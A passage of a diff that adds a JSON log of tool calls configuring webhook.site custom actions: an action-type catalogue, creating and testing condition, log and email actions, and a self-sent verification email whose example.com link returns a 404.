+       "bucket_name",
+       "object_key"
+      ],
+      "optional": [
+       "region"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "aws_s3_get_object",
+      "description": "Aws s3 get object",
+      "required": [
+       "provider_id",
+       "bucket_name",
+       "object_key",
+       "variable_name"
+      ],
+      "optional": [
+       "region"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "aws_s3_put_object",
+      "description": "Aws s3 put object",
+      "required": [
+       "provider_id",
+       "region",
+       "object_key",
+       "body"
+      ],
+      "optional": [
+       "bucket_name",
+       "canned_acl"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "condition",
+      "description": "Compare `input` with `value` using `operator`; `action` stop/continue/noop decides what happens when it passes.",
+      "required": [
+       "input",
+       "operator",
+       "value",
+       "action"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "conditions",
+      "description": "Several conditions with mode one/all/none; `action` stop/continue/noop when they pass.",
+      "required": [
+       "conditions",
+       "mode",
+       "action"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "database",
+      "description": "Run SQL on your own MySQL/Postgres/SQL Server.",
+      "required": [
+       "type",
+       "host",
+       "database",
+       "username",
+       "statement"
+      ],
+      "optional": [
+       "port",
+       "password",
+       "params",
+       "variable_name",
+       "charset"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "discord_send_message",
+      "description": "Post to Discord through a connected provider.",
+      "required": [
+       "provider_id",
+       "content"
+      ],
+      "optional": [
+       "username",
+       "avatar_url",
+       "embed_type",
+       "embed_url"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "dont_save",
+      "description": "Do not store this request in the history.",
+      "required": [],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "dropbox_create_folder",
+      "description": "Dropbox create folder",
+      "required": [
+       "provider_id",
+       "path"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "dropbox_delete",
+      "description": "Dropbox delete",
+      "required": [
+       "provider_id",
+       "path"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "dropbox_download_file",
+      "description": "Dropbox download file",
+      "required": [
+       "provider_id",
+       "path",
+       "variable_name"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "dropbox_get_link",
+      "description": "Dropbox get link",
+      "required": [
+       "provider_id",
+       "path"
+      ],
+      "optional": [
+       "variable_name",
+       "type",
+       "share_audience"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "dropbox_upload_file",
+      "description": "Dropbox upload file",
+      "required": [
+       "provider_id",
+       "path",
+       "body",
+       "mode"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "extract_jsonpath",
+      "description": "Pull a value out of JSON with a JSONPath expression into $variable_name$.",
+      "required": [
+       "jsonpath",
+       "variable_name"
+      ],
+      "optional": [
+       "source",
+       "default",
+       "repeat"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "extract_regex",
+      "description": "Capture a regex match from the request into $variable_name$.",
+      "required": [
+       "regex",
+       "variable_name"
+      ],
+      "optional": [
+       "source",
+       "default",
+       "repeat"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "extract_xpath",
+      "description": "Pull a value out of XML/HTML with XPath into $variable_name$.",
+      "required": [
+       "xpath",
+       "variable_name"
+      ],
+      "optional": [
+       "source",
+       "default"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "ftp_download",
+      "description": "Ftp download",
+      "required": [
+       "host",
+       "password",
+       "username",
+       "path"
+      ],
+      "optional": [
+       "port",
+       "ssl",
+       "passive",
+       "variable_name"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "ftp_upload",
+      "description": "Ftp upload",
+      "required": [
+       "host",
+       "password",
+       "username",
+       "path",
+       "content"
+      ],
+      "optional": [
+       "port",
+       "ssl",
+       "passive"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "google_sheets_add_row",
+      "description": "Google sheets add row",
+      "required": [
+       "provider_id",
+       "spreadsheet_id",
+       "range",
+       "values"
+      ],
+      "optional": [
+       "formula_mode"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "google_sheets_get_values",
+      "description": "Google sheets get values",
+      "required": [
+       "provider_id",
+       "spreadsheet_id",
+       "range",
+       "variable_name"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "google_sheets_update_row",
+      "description": "Google sheets update row",
+      "required": [
+       "provider_id",
+       "spreadsheet_id",
+       "range",
+       "values"
+      ],
+      "optional": [
+       "formula_mode"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "http",
+      "description": "Send an HTTP request to any URL (forward, JSON, multipart, urlencoded); response goes into $variable_name$.",
+      "required": [
+       "url"
+      ],
+      "optional": [
+       "content",
+       "method",
+       "mode",
+       "auth",
+       "multipart",
+       "urlencoded",
+       "headers",
+       "skip_ssl_verification",
+       "variable_name",
+       "timeout",
+       "retry"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "hubspot_create_contact",
+      "description": "Hubspot create contact",
+      "required": [
+       "provider_id",
+       "properties"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "image_resize",
+      "description": "Resize an uploaded image.",
+      "required": [
+       "source",
+       "aspect_ratio"
+      ],
+      "optional": [
+       "width",
+       "height",
+       "variable_name"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "javascript",
+      "description": "Run JavaScript; access variables and set the response from code.",
+      "required": [
+       "script"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "log",
+      "description": "Write text or markdown to the request's action log.",
+      "required": [
+       "text"
+      ],
+      "optional": [
+       "mode"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "microsoft_drive_download",
+      "description": "Microsoft drive download",
+      "required": [
+       "provider_id",
+       "path",
+       "variable_name"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "microsoft_drive_upload",
+      "description": "Microsoft drive upload",
+      "required": [
+       "provider_id",
+       "path"
+      ],
+      "optional": [
+       "content_type",
+       "content",
+       "variable_name"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "microsoft_excel_add_rows",
+      "description": "Microsoft excel add rows",
+      "required": [
+       "provider_id",
+       "values"
+      ],
+      "optional": [
+       "path",
+       "table",
+       "index"
+      ],
+      "status": "needs_provider"
+     },
+     {
+      "type": "microsoft_excel_get_values",
+      "description": "Microsoft excel get values",
+      "required": [
+       "provider_id",
+       "path",
+       "worksheet",
+       "range",
+       "variable_name"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "mock",
+      "description": "Turn the URL into a mock server for an OpenAPI/Swagger spec: responses follow the spec's paths and schemas.",
+      "required": [
+       "source"
+      ],
+      "optional": [
+       "path"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "modify_response",
+      "description": "Set the HTTP response (body, status, headers) the URL returns for this request; `stop` ends the chain.",
+      "required": [],
+      "optional": [
+       "content",
+       "status",
+       "headers",
+       "stop"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "ntfy",
+      "description": "Push a notification to an ntfy.sh topic.",
+      "required": [
+       "topic",
+       "message"
+      ],
+      "optional": [
+       "title",
+       "icon"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "pdf_generate",
+      "description": "Render HTML or markdown to a PDF file variable.",
+      "required": [],
+      "optional": [
+       "content",
+       "mode",
+       "paper",
+       "orientation",
+       "variable_name"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "pushed_send",
+      "description": "Pushed send",
+      "required": [
+       "app_key",
+       "app_secret",
+       "target_type",
+       "target",
+       "message"
+      ],
+      "optional": [],
+      "status": "runtime_error"
+     },
+     {
+      "type": "rabbitmq_get",
+      "description": "Rabbitmq get",
+      "required": [
+       "host",
+       "username",
+       "password",
+       "queue"
+      ],
+      "optional": [
+       "port",
+       "vhost",
+       "ssl",
+       "variable_name"
+      ],
+      "status": "server_error"
+     },
+     {
+      "type": "rabbitmq_publish",
+      "description": "Rabbitmq publish",
+      "required": [
+       "host",
+       "username",
+       "password",
+       "queue",
+       "message"
+      ],
+      "optional": [
+       "port",
+       "vhost",
+       "ssl"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "rate_limit",
+      "description": "Reject requests beyond `count` per `period` seconds (optionally per `key`).",
+      "required": [
+       "period",
+       "count"
+      ],
+      "optional": [
+       "key"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "script",
+      "description": "Run WebhookScript (webhook.site's scripting language); use echo(), respond(), var(), set().",
+      "required": [
+       "script"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "send_email",
+      "description": "Send an email from webhook.site (also fires on incoming emails: guard with a condition on $request.type$).",
+      "required": [
+       "recipient",
+       "subject"
+      ],
+      "optional": [
+       "sender",
+       "content",
+       "is_html",
+       "attachments"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "send_email_smtp",
+      "description": "Send an email through your own SMTP server.",
+      "required": [
+       "recipient",
+       "subject",
+       "username",
+       "password",
+       "host"
+      ],
+      "optional": [
+       "sender_name",
+       "sender_email",
+       "content",
+       "is_html",
+       "encryption",
+       "port",
+       "attachments"
+      ],
+      "status": "server_error"
+     },
+     {
+      "type": "send_request",
+      "description": "Simpler HTTP request action (legacy); prefer `http`.",
+      "required": [
+       "url"
+      ],
+      "optional": [
+       "content",
+       "method",
+       "headers",
+       "skip_ssl_verification",
+       "variable_name",
+       "timeout"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "set_variable",
+      "description": "Set a runtime variable (text, random string, or formatted date).",
+      "required": [
+       "name"
+      ],
+      "optional": [
+       "value",
+       "mode",
+       "random",
+       "date"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "sftp_download",
+      "description": "Sftp download",
+      "required": [
+       "host",
+       "username",
+       "path"
+      ],
+      "optional": [
+       "provider_id",
+       "port",
+       "password",
+       "variable_name"
+      ],
+      "status": "server_error"
+     },
+     {
+      "type": "sftp_upload",
+      "description": "Sftp upload",
+      "required": [
+       "host",
+       "username",
+       "path",
+       "content"
+      ],
+      "optional": [
+       "provider_id",
+       "port",
+       "password"
+      ],
+      "status": "server_error"
+     },
+     {
+      "type": "slack_send_message",
+      "description": "Post to a Slack incoming webhook URL.",
+      "required": [
+       "webhook_url",
+       "content"
+      ],
+      "optional": [
+       "raw"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "sleep",
+      "description": "Pause for `delay` seconds before continuing.",
+      "required": [
+       "delay"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "ssh_run_command",
+      "description": "Ssh run command",
+      "required": [
+       "host",
+       "username",
+       "command"
+      ],
+      "optional": [
+       "provider_id",
+       "port",
+       "password",
+       "variable_name"
+      ],
+      "status": "server_error"
+     },
+     {
+      "type": "stop",
+      "description": "Stop running further actions.",
+      "required": [],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "store_global_variable",
+      "description": "Persist a value as a Global Variable shared by all URLs.",
+      "required": [
+       "name"
+      ],
+      "optional": [
+       "value"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "template",
+      "description": "Include the actions of a saved Template.",
+      "required": [
+       "template_id"
+      ],
+      "optional": [
+       "variables"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "text_decrypt",
+      "description": "Decrypt text produced by text_encrypt.",
+      "required": [
+       "source",
+       "password"
+      ],
+      "optional": [
+       "variable_name"
+      ],
+      "status": "runtime_error"
+     },
+     {
+      "type": "text_encrypt",
+      "description": "AES-encrypt `source` with `password`.",
+      "required": [
+       "source",
+       "password"
+      ],
+      "optional": [
+       "variable_name"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "text_map",
+      "description": "Map `source` to another value through a lookup table.",
+      "required": [
+       "source",
+       "operator",
+       "variable_name",
+       "default",
+       "mappings"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "text_replace",
+      "description": "Replace substrings in `source`.",
+      "required": [
+       "source",
+       "variable_name",
+       "replacements"
+      ],
+      "optional": [],
+      "status": "ok"
+     },
+     {
+      "type": "text_split",
+      "description": "Split `source` on `delimiter` (can repeat over the parts).",
+      "required": [
+       "delimiter",
+       "source"
+      ],
+      "optional": [
+       "variable_name",
+       "repeat"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "twitter_tweet",
+      "description": "Twitter tweet",
+      "required": [
+       "provider_id",
+       "tweet"
+      ],
+      "optional": [],
+      "status": "needs_provider"
+     },
+     {
+      "type": "validate_json",
+      "description": "Check that `source` is valid JSON (optionally against a JSON Schema); sets $validator.count$ and $validator.errors$, errors the action on failure.",
+      "required": [
+       "source"
+      ],
+      "optional": [
+       "schema"
+      ],
+      "status": "ok"
+     },
+     {
+      "type": "webhook_get_requests",
+      "description": "Fetch requests of another token into $variable_name$ (can repeat over them).",
+      "required": [
+       "token_id"
+      ],
+      "optional": [
+       "variable_name",
+       "repeat",
+       "sorting",
+       "query",
+       "max"
+      ],
+      "status": "server_error"
+     }
+    ]
+   }
+  },
+  {
+   "seq": 26,
+   "tool": "manage_custom_actions",
+   "args": {
+    "action": "types",
+    "type": "send_email"
+   },
+   "result": {
+    "success": true,
+    "message": "Reference for 'send_email'",
+    "type": "send_email",
+    "description": "Send an email from webhook.site (also fires on incoming emails: guard with a condition on $request.type$).",
+    "params": {
+     "sender": {
+      "required": false,
+      "type": "string"
+     },
+     "recipient": {
+      "required": true,
+      "type": "string"
+     },
+     "content": {
+      "required": false,
+      "type": "string"
+     },
+     "is_html": {
+      "required": false,
+      "type": "bool"
+     },
+     "subject": {
+      "required": true,
+      "type": "string"
+     },
+     "attachments": {
+      "required": false,
+      "type": "array"
+     }
+    },
+    "verified": {
+     "status": "ok",
+     "meaning": "verified working",
+     "checked_at": "2026-09-03",
+     "output": "Email sent to 29592567-e90b-4e6a-ad08-0c33a6387f13@email.webhook.site with subject \"probe\""
+    },
+    "example_parameters": {
+     "recipient": "29592567-e90b-4e6a-ad08-0c33a6387f13@email.webhook.site",
+     "subject": "probe"
+    }
+   }
+  },
+  {
+   "seq": 27,
+   "tool": "manage_custom_actions",
+   "args": {
+    "action": "variables"
+   },
+   "result": {
+    "success": true,
+    "message": "Variable reference",
+    "syntax": "Wrap a variable in dollar signs: $request.content$. Escape with backslashes to keep a literal.",
+    "base_variables": [
+     {
+      "name": "request.uuid",
+      "for": "all",
+      "meaning": "Request UUID"
+     },
+     {
+      "name": "request.token_id",
+      "for": "all",
+      "meaning": "Token UUID"
+     },
+     {
+      "name": "request.content",
+      "for": "all",
+      "meaning": "Body (web) or raw email"
+     },
+     {
+      "name": "request.date",
+      "for": "all",
+      "meaning": "Created at, Y-m-d H:i:s"
+     },
+     {
+      "name": "request.timestamp",
+      "for": "all",
+      "meaning": "Created at, unix seconds"
+     },
+     {
+      "name": "request.hostname",
+      "for": "all",
+      "meaning": "Host the request hit"
+     },
+     {
+      "name": "request.header.<name>",
+      "for": "all",
+      "meaning": "One variable per header, lowercase name"
+     },
+     {
+      "name": "request.size",
+      "for": "all",
+      "meaning": "Body size in bytes"
+     },
+     {
+      "name": "request.type",
+      "for": "all",
+      "meaning": "web, email or dns"
+     },
+     {
+      "name": "request.file.<field>.filename|size|content|content_type|id|link",
+      "for": "all",
+      "meaning": "Uploaded files / attachments"
+     },
+     {
+      "name": "request.query.<name>",
+      "for": "web",
+      "meaning": "One variable per query-string key"
+     },
+     {
+      "name": "request.form.<name>",
+      "for": "web",
+      "meaning": "One variable per form field"
+     },
+     {
+      "name": "request.ip",
+      "for": "web",
+      "meaning": "Client IP"
+     },
+     {
+      "name": "request.user_agent",
+      "for": "web",
+      "meaning": "User-Agent header"
+     },
+     {
+      "name": "request.url",
+      "for": "web",
+      "meaning": "Full URL"
+     },
+     {
+      "name": "request.path",
+      "for": "web",
+      "meaning": "Sub-path after the token, default /"
+     },
+     {
+      "name": "request.query",
+      "for": "web",
+      "meaning": "Full query string"
+     },
+     {
+      "name": "request.method",
+      "for": "web",
+      "meaning": "HTTP method"
+     },
+     {
+      "name": "request.sender",
+      "for": "email",
+      "meaning": "Envelope sender"
+     },
+     {
+      "name": "request.message_id",
+      "for": "email",
+      "meaning": "Message-ID"
+     },
+     {
+      "name": "request.text_content",
+      "for": "email",
+      "meaning": "Plain text (HTML converted)"
+     },
+     {
+      "name": "request.html_content",
+      "for": "email",
+      "meaning": "HTML part"
+     },
+     {
+      "name": "request.destinations",
+      "for": "email",
+      "meaning": "Recipients, comma separated"
+     },
+     {
+      "name": "request.checks.<name>",
+      "for": "email",
+      "meaning": "spam, virus, spf, dkim, dmarc as true/false"
+     },
+     {
+      "name": "error.<order>",
+      "for": "all",
+      "meaning": "Error text of the action with that order, when it failed"
+     }
+    ],
+    "modifiers": {
+     "syntax": "$name.modifier$",
+     "available": [
+      ".json",
+      ".json_format",
+      ".html_encode",
+      ".html_decode",
+      ".html_strip",
+      ".base64_encode",
+      ".base64_decode",
+      ".url_encode",
+      ".url_decode",
+      ".upper",
+      ".lower"
+     ]
+    },
+    "action_outputs": "Actions that set variable_name expose their result as $variable_name$; extract/split/get-requests with repeat expose $name.0.field$, $name.1.field$ ... or loop per item.",
+    "global_variables": "Global Variables (manage_global_variables) are available everywhere as $name$."
+   }
+  },
+  {
+   "seq": 28,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "create",
+    "type": "http",
+    "parameters": {}
+   },
+   "result": {
+    "success": false,
+    "message": "Validation Error: Custom action 'http' needs parameters: url. Call manage_custom_actions(action='types', type='http') for the reference."
+   }
+  },
+  {
+   "seq": 29,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "create",
+    "type": "condition",
+    "order": 1,
+    "parameters": {
+     "input": "$request.type$",
+     "operator": "neq",
+     "value": "web",
+     "action": "stop"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action 'condition' created",
+    "action": {
+     "uuid": "796c5dd3-9d79-4dd0-8d9c-f9e36d779d69",
+     "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+     "type": "condition",
+     "order": 1,
+     "disabled": null,
+     "queue": null,
+     "queue_id": null,
+     "delay": 0,
+     "condition": null,
+     "name": null,
+     "parameters": {
+      "input": "$request.type$",
+      "operator": "neq",
+      "value": "web",
+      "action": "stop"
+     }
+    }
+   }
+  },
+  {
+   "seq": 30,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "create",
+    "type": "log",
+    "order": 2,
+    "parameters": {
+     "text": "seen $request.method$"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action 'log' created",
+    "action": {
+     "uuid": "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230",
+     "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+     "type": "log",
+     "order": 2,
+     "disabled": null,
+     "queue": null,
+     "queue_id": null,
+     "delay": 0,
+     "condition": null,
+     "name": null,
+     "parameters": {
+      "text": "seen $request.method$"
+     }
+    }
+   }
+  },
+  {
+   "seq": 31,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "list"
+   },
+   "result": {
+    "success": true,
+    "message": "Retrieved 2 custom actions",
+    "actions": [
+     {
+      "uuid": "796c5dd3-9d79-4dd0-8d9c-f9e36d779d69",
+      "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+      "name": null,
+      "type": "condition",
+      "disabled": false,
+      "queue": false,
+      "queue_id": null,
+      "delay": 0,
+      "condition": null,
+      "parameters": {
+       "input": "$request.type$",
+       "operator": "neq",
+       "value": "web",
+       "action": "stop"
+      },
+      "order": 1,
+      "created_at": "2026-09-03T20:12:41.000000Z",
+      "updated_at": "2026-09-03T20:12:41.000000Z"
+     },
+     {
+      "uuid": "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230",
+      "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+      "name": null,
+      "type": "log",
+      "disabled": false,
+      "queue": false,
+      "queue_id": null,
+      "delay": 0,
+      "condition": null,
+      "parameters": {
+       "text": "seen $request.method$"
+      },
+      "order": 2,
+      "created_at": "2026-09-03T20:12:41.000000Z",
+      "updated_at": "2026-09-03T20:12:41.000000Z"
+     }
+    ]
+   }
+  },
+  {
+   "seq": 32,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "test",
+    "type": "script",
+    "parameters": {
+     "script": "echo('live check')"
+    },
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f"
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action test run finished",
+    "result": {
+     "output": {
+      "796c5dd3-9d79-4dd0-8d9c-f9e36d779d69": [
+       "Condition \"web\" is not equal to \"web\" evaluated to NO: Execution continued."
+      ],
+      "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230": [
+       "seen POST"
+      ],
+      "00000000-0000-4000-0000-000000000000": [
+       "live check"
+      ]
+     },
+     "response": {
+      "content": "",
+      "status": 200,
+      "headers": null
+     },
+     "variables": {
+      "request.uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+      "request.token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+      "request.content": "",
+      "request.date": "2026-09-03 20:12:35",
+      "request.timestamp": 1788466355,
+      "request.sorting": 1788466355077961,
+      "request.hostname": "webhook.site",
+      "request.size": 0,
+      "request.type": "web",
+      "request.header.content-type": "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f",
+      "request.header.content-length": "190",
+      "request.header.user-agent": "python-httpx/0.28.1",
+      "request.header.accept-encoding": "gzip, deflate, br",
+      "request.header.accept": "*/*",
+      "request.header.host": "webhook.site",
+      "request.file.report.filename": "report.txt",
+      "request.file.report.size": 16,
+      "request.file.report.content": "(file content not shown)",
+      "request.file.report.id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+      "request.file.report.link": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260/request/80e4fca4-9248-48eb-be19-fbfe0d4c749f/download/436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+      "request.file.report.content_type": "text/plain",
+      "request.ip": "203.0.113.10",
+      "request.user_agent": "python-httpx/0.28.1",
+      "request.url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "request.path": "/",
+      "request.query": null,
+      "request.method": "POST"
+     },
+     "errors": []
+    }
+   }
+  },
+  {
+   "seq": 33,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "update",
+    "action_id": "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230",
+    "parameters": {
+     "text": "updated $request.method$"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action updated",
+    "action": {
+     "uuid": "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230",
+     "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+     "name": null,
+     "type": "log",
+     "disabled": false,
+     "queue": false,
+     "queue_id": null,
+     "delay": 0,
+     "condition": null,
+     "parameters": {
+      "text": "updated $request.method$"
+     },
+     "order": 2,
+     "created_at": "2026-09-03T20:12:41.000000Z",
+     "updated_at": "2026-09-03T20:12:41.000000Z"
+    }
+   }
+  },
+  {
+   "seq": 34,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "execute",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f"
+   },
+   "result": {
+    "success": true,
+    "message": "Custom actions executed for request 80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "request_id": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+    "result": {
+     "output": {
+      "796c5dd3-9d79-4dd0-8d9c-f9e36d779d69": [
+       "Condition \"web\" is not equal to \"web\" evaluated to NO: Execution continued."
+      ],
+      "c929a7b6-a1c7-4bd2-ade5-ad1145bb9230": [
+       "updated POST"
+      ]
+     },
+     "errors": [],
+     "response": {
+      "content": null,
+      "status": null,
+      "headers": null
+     },
+     "variables": {
+      "request.uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+      "request.token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+      "request.content": "",
+      "request.date": "2026-09-03 20:12:35",
+      "request.timestamp": 1788466355,
+      "request.sorting": 1788466355077961,
+      "request.hostname": "webhook.site",
+      "request.size": 0,
+      "request.type": "web",
+      "request.header.content-type": "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f",
+      "request.header.content-length": "190",
+      "request.header.user-agent": "python-httpx/0.28.1",
+      "request.header.accept-encoding": "gzip, deflate, br",
+      "request.header.accept": "*/*",
+      "request.header.host": "webhook.site",
+      "request.file.report.filename": "report.txt",
+      "request.file.report.size": 16,
+      "request.file.report.content": "(file content not shown)",
+      "request.file.report.id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+      "request.file.report.link": "https://webhook.site/token/5f00600b-6562-4360-beb8-f83ea0c69260/request/80e4fca4-9248-48eb-be19-fbfe0d4c749f/download/436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+      "request.file.report.content_type": "text/plain",
+      "request.ip": "203.0.113.10",
+      "request.user_agent": "python-httpx/0.28.1",
+      "request.url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "request.path": "/",
+      "request.query": null,
+      "request.method": "POST"
+     }
+    }
+   }
+  },
+  {
+   "seq": 35,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "create",
+    "type": "send_email",
+    "order": 3,
+    "parameters": {
+     "recipient": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+     "subject": "Verify your account",
+     "is_html": true,
+     "content": "<p>Your verification code is 847291.</p><p><a href=\"https://example.com/verify?token=abc&amp;u=1\">Verify your email</a></p>"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action 'send_email' created",
+    "action": {
+     "uuid": "30a7735d-d063-4d0d-9c37-5382f88e6e01",
+     "token_id": "5f00600b-6562-4360-beb8-f83ea0c69260",
+     "type": "send_email",
+     "order": 3,
+     "disabled": null,
+     "queue": null,
+     "queue_id": null,
+     "delay": 0,
+     "condition": null,
+     "name": null,
+     "parameters": {
+      "recipient": "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site",
+      "content": "<p>Your verification code is 847291.</p><p><a href=\"https://example.com/verify?token=abc&amp;u=1\">Verify your email</a></p>",
+      "is_html": true,
+      "subject": "Verify your account"
+     }
+    }
+   }
+  },
+  {
+   "seq": 36,
+   "tool": "wait_for_email",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "timeout_seconds": 90
+   },
+   "result": {
+    "success": true,
+    "message": "Email received: Verify your account",
+    "email": {
+     "uuid": "54177230-e709-4118-a211-0631aa8b3160",
+     "from": "\"Webhook.site\" <5f00600b-6562-4360-beb8-f83ea0c69260@emailhook.site>",
+     "sender": "user@example.com",
+     "subject": "Verify your account",
+     "text_content": "Your verification code is 847291.\n\n[Verify your email](https://example.com/verify?token=abc&u=1)",
+     "created_at": "2026-09-03 20:12:44",
+     "checks": {
+      "spam": false,
+      "virus": true,
+      "spf": true,
+      "dkim": true,
+      "dmarc": true
+     },
+     "html_omitted": true,
+     "verification_codes": [
+      "847291"
+     ],
+     "auth_links": [
+      "https://example.com/verify?token=abc&u=1"
+     ],
+     "all_links": [
+      "https://example.com/verify?token=abc&u=1"
+     ]
+    },
+    "waited": true,
+    "source": "socket"
+   }
+  },
+  {
+   "seq": 37,
+   "tool": "send_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "data": {
+     "trigger": "mail"
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Sent 1/1 requests successfully",
+    "total": 1,
+    "success_count": 1,
+    "fail_count": 0,
+    "results": [
+     {
+      "index": 0,
+      "success": true,
+      "status_code": 200
+     }
+    ]
+   }
+  },
+  {
+   "seq": 38,
+   "tool": "follow_email_link",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "request_id": "54177230-e709-4118-a211-0631aa8b3160"
+   },
+   "result": {
+    "success": false,
+    "message": "Opened email link (404)",
+    "request_id": "54177230-e709-4118-a211-0631aa8b3160",
+    "opened_url": "https://example.com/verify?token=abc&u=1",
+    "auth_links": [
+     "https://example.com/verify?token=abc&u=1"
+    ],
+    "status_code": 404,
+    "final_url": "https://example.com/verify?token=abc&u=1",
+    "title": "Example Domain",
+    "preview": "<!doctype html><html lang=\"en\"><head><title>Example Domain</title><link rel=\"icon\" href=\"data:,\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href=\"https://iana.org/domains/example\">Learn more</a></p></div></body></html>\n",
+    "redirects": []
+   }
+  },
+  {
+   "seq": 39,
+   "tool": "manage_custom_actions",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "action": "delete",
